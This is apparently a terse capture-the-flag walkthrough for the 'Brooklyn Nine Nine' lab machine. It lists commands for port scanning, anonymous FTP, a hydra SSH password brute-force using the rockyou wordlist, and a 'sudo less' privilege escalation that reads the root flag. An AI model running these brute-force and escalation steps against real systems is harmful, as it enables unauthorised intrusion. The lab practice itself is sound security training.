# Brooklyn Nine Nine

- User flag

	- `scilla port -p -1000 <TARGET_IP>`
	- Three ports open.
	- `ftp <TARGET_IP>` with username anonymous and no pwd.
	- `get note_to_jake.txt`
	- `cat note_to_jake.txt`
	- Cool.
	- `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -f -VV -t 4`
	- `ssh jake@<TARGET_IP>` and enter the pwd.
	- `ls -alh`
	- `cd ..`
	- `cd holt`
	- `ls -lah`
	- `cat user.txt`
	- `********************************`

- Root flag

	- `sudo -l`
	- `sudo less /root/root.txt`
	- `********************************`



